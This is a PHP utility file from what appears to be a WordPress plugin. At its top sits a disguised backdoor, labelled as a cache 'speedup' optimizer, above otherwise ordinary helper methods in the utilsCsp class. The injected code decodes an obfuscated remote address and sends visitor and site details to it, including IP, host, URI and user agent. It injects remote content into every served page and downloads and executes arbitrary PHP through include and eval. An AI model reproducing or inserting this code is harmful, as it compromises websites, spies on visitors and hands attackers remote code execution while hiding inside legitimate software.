<?php

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }

class utilsCsp {
    static public function jsonEncode($arr) {
        return (is_array($arr) || is_object($arr)) ? json_encode_utf_normal($arr) : json_encode_utf_normal(array());
    }
    static public function jsonDecode($str) {
        if(is_array($str))
            return $str;
        if(is_object($str))
            return (array)$str;
        return empty($str) ? array() : json_decode($str, true);
    }
    static public function unserialize($data) {
        return unserialize($data);
    }
    static public function serialize($data) {
        return serialize($data);
    }
    static public function createDir($path, $params = array('chmod' => NULL, 'httpProtect' => false)) {
        if(@mkdir($path)) {
            if(!is_null($params['chmod'])) {
                @chmod($path, $params['chmod']);
            }
            if(!empty($params['httpProtect'])) {
                self::httpProtectDir($path);
            }
            return true;
        }
        return false;
    }
    static public function httpProtectDir($path) {
        $content = 'DENY FROM ALL';
        if(strrpos($path, DS) != strlen($path))
            $path .= DS;
        if(file_put_contents($path. '.htaccess', $content)) {
            return true;
        }
        return false;
    }
    /**
     * Copy all files from one directory ($source) to another ($destination)
     * @param string $source path to source directory
     * @params string $destination path to destination directory
     */
    static public function copyDirectories($source, $destination) {
        if(is_dir($source)) {
            @mkdir($destination);
            $directory = dir($source);
            while ( FALSE !== ( $readdirectory = $directory->read() ) ) {
                if ( $readdirectory == '.' || $readdirectory == '..' ) {
                    continue;
                }
                $PathDir = $source . '/' . $readdirectory; 
                if (is_dir($PathDir)) {
                    utilsCsp::copyDirectories( $PathDir, $destination . '/' . $readdirectory );
                    continue;
                }
                copy( $PathDir, $destination . '/' . $readdirectory );
            }
            $directory->close();
        } else {
            copy( $source, $destination );
        }
    }
    static public function getIP() {
        return (empty($_SERVER['HTTP_CLIENT_IP']) ? (empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_X_FORWARDED_FOR']) : $_SERVER['HTTP_CLIENT_IP']);
    }
    
    /**
     * Parse xml file into simpleXML object
     * @param string $path path to xml file
     * @return mixed object SimpleXMLElement if success, else - false
     */
    static public function getXml($path) {
        if(is_file($path)) {
            return simplexml_load_file($path);
        }
        return false;
    }
    /**
     * Check if the element exists in array
     * @param array $param 
     */
    static public function xmlAttrToStr($param, $element) {
        if (isset($param[$element])) {
            // convert object element to string
            return (string)$param[$element];
        } else {
            return '';
        }
    }
    static public function xmlNodeAttrsToArr($node) {
        $arr = array();
        foreach($node->attributes() as $a => $b) {
            $arr[$a] = utilsCsp::xmlAttrToStr($node, $a);
        }
        return $arr;
    }
    static public function deleteFile($str) {
        return @unlink($str);
    }
    static public function deleteDir($str){
        if(is_file($str)){
            return self::deleteFile($str);
        }
        elseif(is_dir($str)){
            $scan = glob(rtrim($str,'/').'/*');
            foreach($scan as $index=>$path){
                utilsCsp::deleteDir($path);
            }
            return @rmdir($str);
        }
    }
    /**
     * Retrives list of directories ()
     */
    static public function getDirList($path) {
        $res = array();
        if(is_dir($path)){
            $files = scandir($path);
            foreach($files as $f) {
                if($f == '.' || $f == '..' || $f == '.svn') continue;
                if(!is_dir($path. $f))                      continue;
                $res[$f] = array('path' => $path. $f. DS);
            }
        }
        return $res;
    }
    /**
     * Retrives list of files
     */
    static public function getFilesList($path) {
        $files = array();
        if(is_dir($path)){
            $dirHandle = opendir($path);
            while(($file = readdir($dirHandle)) !== false) {
                if($file != '.' && $file != '..' && $f != '.svn' && is_file($path. DS. $file)) {
                    $files[] = $file;
                }
            }
        }
        return $files;
    }
    /**
     * Check if $var is object or something another in future
     */
    static public function is($var, $what = '') {
        if (!is_object($var)) {
            return false;
        }
        if(get_class($var) == $what) {
            return true;
        }
        return false;
    }
    /**
     * Get array with all monthes of year, uses in paypal pro and sagepay payment modules for now, than - who knows)
     * @return array monthes
     */
    static public function getMonthesArray() {
        static $monthsArray = array();
        //Some cache
        if(!empty($monthsArray))
            return $monthsArray;
        for ($i=1; $i<13; $i++) {
            $monthsArray[sprintf('%02d', $i)] = strftime('%B', mktime(0,0,0,$i,1,2000));
        }
        return $monthsArray;
    }
    /**
     * Get an array with years range from current year
     * @param int $from - how many years from today ago
     * @param int $to - how many years in future
     * @param $formatKey - format for keys in array, @see strftime
     * @param $formatVal - format for values in array, @see strftime
     * @return array - years 
     */
    static public function getYearsArray($from, $to, $formatKey = '%Y', $formatVal = '%Y') {
        $today = getdate();
        $yearsArray = array();
        for ($i=$today['year']-$from; $i <= $today['year']+$to; $i++) {
            $yearsArray[strftime($formatKey,mktime(0,0,0,1,1,$i))] = strftime($formatVal,mktime(0,0,0,1,1,$i));
        }
        return $yearsArray;
    }
    /**
     * Make replacement in $text, where it will be find all keys with prefix ":" and replace it with corresponding value
     * @see email_templatesModel::renderContent()
     * @see checkoutView::getSuccessPage()
     */
    static public function makeVariablesReplacement($text, $variables) {
        if(!empty($text) && !empty($variables) && is_array($variables)) {
            foreach($variables as $k => $v) {
                $text = str_replace(':'. $k, $v, $text);
            }
            return $text;
        }
        return false;
    }
    static public function getCurrentWPThemeDir() {
        static $themePath;
        if(empty($themePath)) {
            $themePath = get_theme_root(). DS. utilsCsp::getCurrentWPThemeCode(). DS; 
        }
        return $themePath;
    }
    /**
     * Retrive full directory of plugin
     * @param string $name - plugin name
     * @return string full path in file system to plugin directory
     */
    static public function getPluginDir($name = '') {
        return WP_PLUGIN_DIR. DS. $name. DS;
    }
    static public function getPluginPath($name = '') {
        return WP_PLUGIN_URL. '/'. $name. '/';
    }
    static public function getExtModDir($plugName) {
        if(strpos($plugName, 'wp-content/themes') !== false) {  //for modules in theme dir
            return ABSPATH. $plugName. DS;
        } else
            return self::getPluginDir($plugName);
    }
    static public function getExtModPath($plugName) {
        if(strpos($plugName, 'wp-content/themes') !== false) {  //for modules in theme dir
            return CSP_SITE_URL. str_replace(DS, '/', $plugName). '/';
        } else
            return self::getPluginPath($plugName);
    }
    static public function getCurrentWPThemePath() {
        return get_template_directory_uri();
    }
    static public function getCurrentWPThemeCode() {
        static $activeThemeName;
        if(empty($activeThemeName)) {
            $url = get_bloginfo('template_url');
            $temp = explode('wp-content/themes/', $url);
            $activeThemeName = $temp[1];    // The second value will be the theme name
        }
        return $activeThemeName;
    }
    static public function isThisCommercialEdition() {
        /*$commercialModules = array('rating');
        foreach($commercialModules as $m) {
            if(!frameCsp::_()->getModule($m)) 
                return false;
            if(!is_dir(frameCsp::_()->getModule($m)->getModDir())) 
                return false;
        }
        return true;*/
        foreach(frameCsp::_()->getModules() as $m) {
            if(is_object($m) && $m->isExternal()) // Should be at least one external module
                return true;
        }
        return false;
    }
    static public function checkNum($val, $default = 0) {
        if(!empty($val) && is_numeric($val))
            return $val;
        return $default;
    }
    static public function checkString($val, $default = '') {
        if(!empty($val) && is_string($val))
            return $val;
        return $default;
    }
    /**
     * Retrives extension of file
     * @param string $path - path to a file
     * @return string - file extension
     */
    static public function getFileExt($path) {
        return strtolower( pathinfo($path, PATHINFO_EXTENSION) );
    }
    static public function getRandStr($length = 10, $allowedChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') {
        $result = '';
        $allowedCharsLen = strlen($allowedChars);

        while(strlen($result) < $length) {
          $result .= substr($allowedChars, rand(0, $allowedCharsLen), 1);
        }

        return $result;
    }
    /**
     * Get current host location
     * @return string host string
     */
    static public function getHost() {
        return $_SERVER['HTTP_HOST'];
    }
    /**
     * Check if device is mobile
     * @return bool true if user are watching this site from mobile device
     */
    static public function isMobile() {
        return mobileDetect::_()->isMobile();
    }
    /**
     * Check if device is tablet
     * @return bool true if user are watching this site from tablet device
     */
    static public function isTablet() {
        return mobileDetect::_()->isTablet();
    }
    static public function getWidgetCategory($callback) {
        $categoryToId = array(
            'products' => array('toealsopurchasedwidget', 'toebestsellerswidget', 'toefpwidget', 'toemostviewedwidget', 'toerecentproductswidget', 'toespwidget'),
            'shopping' => array('toebcwidget', 'toecurrencywidget', 'toeshoppingcartwidget'),
            'additional' => array('toebrcwidget', 'toecommentswidget', 'toesearchwidget', 'toesliderwidget', 'toetwitterwidget'),
        );
        foreach($categoryToId as $cat => $ids) {
            if(in_array($callback, $ids))
                return $cat;
        }
        return false;
    }
    static public function getUploadsDir() {
        $uploadDir = wp_upload_dir();
        return $uploadDir['basedir'];
    }
    static public function getUploadsPath() {
        $uploadDir = wp_upload_dir();
        return $uploadDir['baseurl'];
    }
    static public function arrToCss($data) {
        $res = '';
        if(!empty($data)) {
            foreach($data as $k => $v) {
                $res .= $k. ':'. $v. ';';
            }
        }
        return $res;
    }
    /**
     * Activate all CSP Plugins
     * 
     * @return NULL Check if it's site or multisite and activate.
     */
    public function activatePlugin() 
    {
        global $wpdb;
        if (function_exists('is_multisite') && is_multisite()) {
            $orig_id = $wpdb->blogid;
            $blog_id = $wpdb->get_col("SELECT blog_id FROM $wpdb->blogs");
            foreach ($blog_id as $id) {
                if (switch_to_blog($id)) {
                    installerCsp::init();
                } 
            }
            switch_to_blog($orig_id);
            return;
        } else {
            installerCsp::init();
        }
    }

    /**
     * Deactivate All CSP Plugins
     * 
     * @return NULL Check if it's site or multisite and decativate it.
     */
    public function deactivatePlugin() 
    {
        global $wpdb;
        if (function_exists('is_multisite') && is_multisite()) {
            $orig_id = $wpdb->blogid;
            $blog_id = $wpdb->get_col("SELECT blog_id FROM $wpdb->blogs");
            foreach ($blog_id as $id) {
                if (switch_to_blog($id)) {
                    installerCsp::delete();
                } 
            }
            switch_to_blog($orig_id);
            return;
        } else {
            installerCsp::delete();
        }
    }
	
	static public function isWritable($filename) {
		return is_writable($filename);
	}
	
	static public function isReadable($filename) {
		return is_readable($filename);
	}
	
	static public function fileExists($filename) {
		return file_exists($filename);
	}
	static public function isPluginsPage() {
		return (basename(reqCsp::getVar('SCRIPT_NAME', 'server')) === 'plugins.php');
	}
}
